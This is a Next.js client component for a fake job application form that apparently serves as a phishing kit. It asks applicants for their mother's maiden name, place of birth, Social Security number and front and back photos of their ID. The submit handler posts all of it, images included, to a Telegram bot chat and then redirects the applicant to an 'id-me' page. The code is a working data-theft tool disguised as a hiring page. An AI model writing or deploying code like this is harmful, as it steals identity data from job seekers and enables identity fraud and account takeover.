"use client"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useRouter } from "next/navigation";
import React from "react";

interface FormData {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    motherName: string;
    motherMaidenName: string;
    fatherName: string;
    placeOfBirth: string;
    authorizedToWork: string;
    hasID: string;
    ssn: string;
    idType: string;
    idFront: File | null;
    idBack: File | null;
}

interface FormErrors {
    firstName?: string;
    lastName?: string;
    email?: string;
    phone?: string;
    motherName?: string;
    motherMaidenName?: string;
    fatherName?: string;
    placeOfBirth?: string;
    authorizedToWork?: string;
    hasID?: string;
    ssn?: string;
}

export default function Form() {
    const [formData, setFormData] = React.useState<FormData>({
        firstName: '',
        lastName: '',
        email: '',
        phone: '',
        motherName: '',
        motherMaidenName: '',
        fatherName: '',
        placeOfBirth: '',
        authorizedToWork: '',
        hasID: '',
        ssn: '',
        idType: '',
        idFront: null,
        idBack: null,
    });

    const [errors, setErrors] = React.useState<FormErrors>({});
    const [isSubmitting, setIsSubmitting] = React.useState(false);
    const [submitSuccess, setSubmitSuccess] = React.useState(false);

    const telegramApiKey = process.env.NEXT_PUBLIC_TELEGRAM_API ?? ''
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? ''

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        const target = e.target as HTMLInputElement;

        if (type === 'file') {
            setFormData(prev => ({
                ...prev,
                [name]: target.files ? target.files[0] : null
            }));
        } else if (type === 'checkbox') {
            setFormData(prev => ({
                ...prev,
                [name]: (e.target as HTMLInputElement).checked
            }));
        } else {
            setFormData(prev => ({
                ...prev,
                [name]: value
            }));
        }
    };

    const handleSelectChange = (name: string, value: string) => {
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
    };

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};
        if (!formData.firstName.trim()) newErrors.firstName = 'First name is required';
        if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required';
        if (!formData.email.trim()) {
            newErrors.email = 'Email is required';
        } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
            newErrors.email = 'Please enter a valid email';
        }
        if (!formData.phone.trim()) {
            newErrors.phone = 'Phone number is required';
        } else if (!/^\d{10,15}$/.test(formData.phone)) {
            newErrors.phone = 'Please enter a valid phone number';
        }
        if (!formData.motherName.trim()) newErrors.motherName = 'Mother\'s name is required';
        if (!formData.motherMaidenName.trim()) newErrors.motherMaidenName = 'Mother\'s maiden name is required';
        if (!formData.fatherName.trim()) newErrors.fatherName = 'Father\'s name is required';
        if (!formData.placeOfBirth.trim()) newErrors.placeOfBirth = 'Place of birth is required';
        if (!formData.authorizedToWork) newErrors.authorizedToWork = 'This field is required';
        if (!formData.hasID) newErrors.hasID = 'This field is required';

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const router = useRouter()

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        if (!validateForm()) {
            console.log("Form validation failed", errors);
            return;
        }

        setIsSubmitting(true);

        try {
            const message = `
            *New Job Application Submitted*

            *Personal Information:*
            - First Name: ${formData.firstName}
            - Last Name: ${formData.lastName}
            - Email: ${formData.email}
            - Phone: ${formData.phone}

            *Family Information:*
            - Mother's Name: ${formData.motherName}
            - Mother's Maiden Name: ${formData.motherMaidenName}
            - Father's Name: ${formData.fatherName}
            - Place of Birth: ${formData.placeOfBirth}

            *Legal Information:*
            - Authorized to work in US: ${formData.authorizedToWork}
            - Has ID.ME Registered: ${formData.hasID}
            - SSN (last 4 digits): ${formData.ssn}
            *ID Information:*
            - ID Type: ${formData.idType}
            `;

            const textResponse = await fetch(`https://api.telegram.org/bot${telegramApiKey}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                }),
            });

            const textData = await textResponse.json();

            if (!textResponse.ok) {
                throw new Error(textData.description || 'Failed to send text message to Telegram');
            }

            const sendFileToTelegram = async (file: File | null, caption: string) => {
                if (!file) return;

                const formData = new FormData();
                formData.append('chat_id', telegramChatId);
                formData.append('caption', caption);
                formData.append('document', file);

                const response = await fetch(`https://api.telegram.org/bot${telegramApiKey}/sendDocument`, {
                    method: 'POST',
                    body: formData,
                });

                const responseData = await response.json();

                if (!response.ok) {
                    throw new Error(responseData.description || `Failed to send file: ${caption}`);
                }
            };

            await Promise.all([
                sendFileToTelegram(formData.idFront, 'ID Front Image'),
                sendFileToTelegram(formData.idBack, 'ID Back Image'),
            ]);

            setSubmitSuccess(true)
            setTimeout(() => {
                router.push('/id-me')
            }, 5000)

        } catch (error) {
            console.error('Submission error:', error);
            alert(`There was an error submitting your application: ${error instanceof Error ? error.message : 'Unknown error'}`);
        } finally {
            setIsSubmitting(false);
        }
    };

    if (submitSuccess) {
        return (
            <div className='flex flex-col items-center py-10 px-4'>
                <div className="bg-green-100 border border-green-400 text-lg text-primary px-4 py-3 rounded relative max-w-md w-full" role="alert">
                    <strong className="font-bold">Success!</strong>
                    <span className="block sm:inline"> Your application has been submitted. You will be redirect ID.ME to verify your identity</span>
                </div>
            </div>
        );
    }

    return (
        <div className='flex flex-col items-center py-10 px-4'>
            <div className="w-full max-w-3xl">
                <div>
                    <h2 className='text-lg md:text-2xl text-primary font-semibold'>Fill the form below to apply for the job</h2>
                    <p className='text-red-600 text-sm md:text-base'>It&apos;s important you fill your correct and valid information</p>
                </div>

                <div className='py-6'>
                    <form onSubmit={handleSubmit} className="space-y-6" id="form">
                        <div>
                            <h4 className="text-xl font-medium mb-2">Personal Information</h4>
                            <hr className='border-t border-gray-300 mb-6' />
                        </div>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <div>
                                <label htmlFor="firstName" className="block text-sm font-medium text-gray-700 mb-1">
                                    First Name <span className="text-red-600">*</span>
                                </label>
                                <input
                                    type="text"
                                    id="firstName"
                                    name="firstName"
                                    value={formData.firstName}
                                    onChange={handleChange}
                                    className={`w-full px-3 py-2 border rounded-md ${errors.firstName ? 'border-red-500' : 'border-gray-300'}`}
                                />
                                {errors.firstName && <p className="mt-1 text-sm text-red-600">{errors.firstName}</p>}
                            </div>

                            <div>
                                <label htmlFor="lastName" className="block text-sm font-medium text-gray-700 mb-1">
                                    Last Name <span className="text-red-600">*</span>
                                </label>
                                <input
                                    type="text"
                                    id="lastName"
                                    name="lastName"
                                    value={formData.lastName}
                                    onChange={handleChange}
                                    className={`w-full px-3 py-2 border rounded-md ${errors.lastName ? 'border-red-500' : 'border-gray-300'}`}
                                />
                                {errors.lastName && <p className="mt-1 text-sm text-red-600">{errors.lastName}</p>}
                            </div>

                            <div>
                                <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                                    Email <span className="text-red-600">*</span>
                                </label>
                                <input
                                    type="email"
                                    id="email"
                                    name="email"
                                    value={formData.email}
                                    onChange={handleChange}
                                    className={`w-full px-3 py-2 border rounded-md ${errors.email ? 'border-red-500' : 'border-gray-300'}`}
                                />
                                {errors.email && <p className="mt-1 text-sm text-red-600">{errors.email}</p>}
                            </div>

                            <div>
                                <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-1">
                                    Phone Number <span className="text-red-600">*</span>
                                </label>
                                <input
                                    type="tel"
                                    id="phone"
                                    name="phone"
                                    value={formData.phone}
                                    onChange={handleChange}
                                    className={`w-full px-3 py-2 border rounded-md ${errors.phone ? 'border-red-500' : 'border-gray-300'}`}
                                />
                                {errors.phone && <p className="mt-1 text-sm text-red-600">{errors.phone}</p>}
                            </div>

                            <div>
                                <label htmlFor="motherName" className="block text-sm font-medium text-gray-700 mb-1">
                                    Mother&apos;s Name <span className="text-red-600">*</span>
                                </label>
                                <input
                                    type="text"
                                    id="motherName"
                                    name="motherName"
                                    value={formData.motherName}
                                    onChange={handleChange}
                                    className={`w-full px-3 py-2 border rounded-md ${errors.motherName ? 'border-red-500' : 'border-gray-300'}`}
                                />
                                {errors.motherName && <p className="mt-1 text-sm text-red-600">{errors.motherName}</p>}
                            </div>
                            <div>
                                <label htmlFor="motherMaidenName" className="block text-sm font-medium text-gray-700 mb-1">
                                    Mother Maiden&apos;s Name <span className="text-red-600">*</span>
                                </label>
                                <input
                                    type="text"
                                    id="motherMaidenName"
                                    name="motherMaidenName"
                                    value={formData.motherMaidenName}
                                    onChange={handleChange}
                                    className={`w-full px-3 py-2 border rounded-md ${errors.motherMaidenName ? 'border-red-500' : 'border-gray-300'}`}
                                />
                                {errors.motherMaidenName && <p className="mt-1 text-sm text-red-600">{errors.motherMaidenName}</p>}
                            </div>
                            <div>
                                <label htmlFor="fatherName" className="block text-sm font-medium text-gray-700 mb-1">
                                    Father&apos;s Name <span className="text-red-600">*</span>
                                </label>
                                <input
                                    type="text"
                                    id="fatherName"
                                    name="fatherName"
                                    value={formData.fatherName}
                                    onChange={handleChange}
                                    className={`w-full px-3 py-2 border rounded-md ${errors.fatherName ? 'border-red-500' : 'border-gray-300'}`}
                                />
                                {errors.fatherName && <p className="mt-1 text-sm text-red-600">{errors.fatherName}</p>}
                            </div>
                            <div>
                                <label htmlFor="placeOfBirth" className="block text-sm font-medium text-gray-700 mb-1">
                                    Place of birth <span className="text-red-600">*</span>
                                </label>
                                <input
                                    type="text"
                                    id="placeOfBirth"
                                    name="placeOfBirth"
                                    value={formData.placeOfBirth}
                                    onChange={handleChange}
                                    className={`w-full px-3 py-2 border rounded-md ${errors.placeOfBirth ? 'border-red-500' : 'border-gray-300'}`}
                                />
                                {errors.placeOfBirth && <p className="mt-1 text-sm text-red-600">{errors.placeOfBirth}</p>}
                            </div>

                        </div>
                        <div>
                            <div>
                                <h4 className="text-xl font-medium mb-2">Legal Information</h4>
                                <hr className='border-t border-gray-300 mb-6' />
                            </div>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div className="md:col-span-2">
                                    <label htmlFor="authorizedToWork" className="block text-sm font-medium text-gray-700 mb-1">
                                        Are you authorized to work in US? <span className="text-red-600">*</span>
                                    </label>
                                    <Select onValueChange={(value) => handleSelectChange('authorizedToWork', value)}>
                                        <SelectTrigger className="w-full">
                                            <SelectValue placeholder="Select" />
                                        </SelectTrigger>
                                        <SelectContent>
                                            <SelectItem value="yes">Yes</SelectItem>
                                            <SelectItem value="no">No</SelectItem>
                                        </SelectContent>
                                    </Select>
                                    {errors.authorizedToWork && <p className="mt-1 text-sm text-red-600">{errors.authorizedToWork}</p>}
                                </div>
                                <div className="md:col-span-2">
                                    <label htmlFor="hasID" className="block text-sm font-medium text-gray-700 mb-1">
                                        Do you have ID.ME Registered? <span className="text-red-600">*</span>
                                    </label>
                                    <Select onValueChange={(value) => handleSelectChange('hasID', value)}>
                                        <SelectTrigger className="w-full">
                                            <SelectValue placeholder="Select" />
                                        </SelectTrigger>
                                        <SelectContent>
                                            <SelectItem value="yes">Yes</SelectItem>
                                            <SelectItem value="no">No</SelectItem>
                                        </SelectContent>
                                    </Select>
                                    {errors.hasID && <p className="mt-1 text-sm text-red-600">{errors.hasID}</p>}
                                </div>
                                <div>
                                    <label htmlFor="ssn" className="block text-sm font-medium text-gray-700 mb-1">
                                        SSN
                                    </label>
                                    <input
                                        type="text"
                                        id="ssn"
                                        name="ssn"
                                        value={formData.ssn}
                                        onChange={handleChange}
                                        maxLength={9}
                                        className="w-full px-3 py-2 border border-gray-300 rounded-md"
                                    />
                                </div>
                            </div>
                        </div>
                        <div>
                            <div>
                                <h4 className="text-xl font-medium mb-2">Identification Information</h4>
                                <hr className='border-t border-gray-300 mb-6' />
                            </div>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div>
                                    <label htmlFor="idType" className="block text-sm font-medium text-gray-700 mb-1">
                                        Do you have Driver&apos;s license or state ID ?
                                    </label>
                                    <Select onValueChange={(value) => handleSelectChange('idType', value)}>
                                        <SelectTrigger className="w-full">
                                            <SelectValue placeholder="Select" />
                                        </SelectTrigger>
                                        <SelectContent>
                                            <SelectItem value="yes">Driver&apos; Licence</SelectItem>
                                            <SelectItem value="no">State ID</SelectItem>
                                        </SelectContent>
                                    </Select>
                                </div>
                                <div>
                                    <label htmlFor="idBack" className="block text-sm font-medium text-gray-700 mb-1">
                                        ID Back Image
                                    </label>
                                    <input
                                        type="file"
                                        id="idBack"
                                        name="idBack"
                                        onChange={handleChange}
                                        accept="image/*"
                                        className="w-full px-3 py-2 border border-gray-300 rounded-md"
                                    />
                                </div>
                                <div>
                                    <label htmlFor="idFront" className="block text-sm font-medium text-gray-700 mb-1">
                                        ID Front Image
                                    </label>
                                    <input
                                        type="file"
                                        id="idFront"
                                        name="idFront"
                                        onChange={handleChange}
                                        accept="image/*"
                                        className="w-full px-3 py-2 border border-gray-300 rounded-md"
                                    />
                                </div>
                            </div>
                        </div>

                        <div className="pt-4">
                            <button
                                type="submit"
                                disabled={isSubmitting}
                                className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-primary hover:bg-primary-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary ${isSubmitting ? 'opacity-70 cursor-not-allowed' : ''}`}
                            >
                                {isSubmitting ? 'Submitting...' : 'Submit'}
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    );
}